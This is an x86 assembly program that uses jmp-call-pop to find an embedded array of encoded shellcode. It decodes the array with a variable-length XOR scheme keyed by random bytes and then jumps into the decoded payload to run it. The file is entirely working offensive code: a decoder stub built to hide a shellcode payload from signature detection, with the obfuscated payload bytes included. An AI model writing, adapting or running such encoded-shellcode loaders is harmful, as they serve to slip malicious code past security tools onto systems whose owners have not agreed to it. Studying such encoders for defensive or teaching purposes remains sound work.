global _start
section .text

_start:                                 ;jmp call pop
    jmp short call_shellcode

decoder:
    pop esi    
    xor ebx, ebx                        ;bh = how many blocks are already decrypted with the random value, bl = for loading, XORing and storing bytes
    xor ecx, ecx                        ;ecx is index of the encrypted shellcode
    xor edx, edx

decode:
	mov bh, 0xff
	inc bh                              ;setting only bh register to 0
	xor eax, eax                        ;setting eax to 0
    mov al, 0xff                        ;storing 0xff in al
    sub al, byte [esi+ecx]              ;substracting 0xff - randomValueByteEncrypted = used random value

randomRound:
	inc ecx                             ;increase index of encrypted shellcode because we decrypted last byte (shellcode or random number)
	cmp bh, al                          ;if we already XORed the amount of bytes what our randomValue says
	jz short decode                     ;we have to get the next randomValue and job to the top
                                        ;if not:
	mov bl, [esi+ecx]                   ;load the next encrypted byte to the bl register
	xor bl, al                          ;xor bl with the random value
	mov byte[esi+edx], bl               ;store the xored byte at the following position of the last stored and xored byte

    cmp dword [esi + edx -3], 0xbbaa9090    ;check if the last 4 bytes are the defined ending
    jz short EncodedShellcode               ;then execute decoded shellcode
    
    inc edx                                 
    inc bh
    jmp short randomRound

call_shellcode:
    call decoder                    
                                            ;encoded shellcode from the python script output                          
    EncodedShellcode: db 0xfd, 0x33, 0xc2, 0xf9, 0x56, 0x6e, 0x29, 0x29, 0x75, 0x6e, 0xfa, 0x6d, 0x2a, 0x67, 0x6c, 0x6b, 0xfc, 0x8a, 0xe0, 0x53, 0xfd, 0x8b, 0xe0, 0xfc, 0x50, 0x8a, 0xe2, 0xf9, 0xb6, 0xd, 0xcb, 0x86, 0x96, 0x96, 0xfd, 0xa8, 0xb9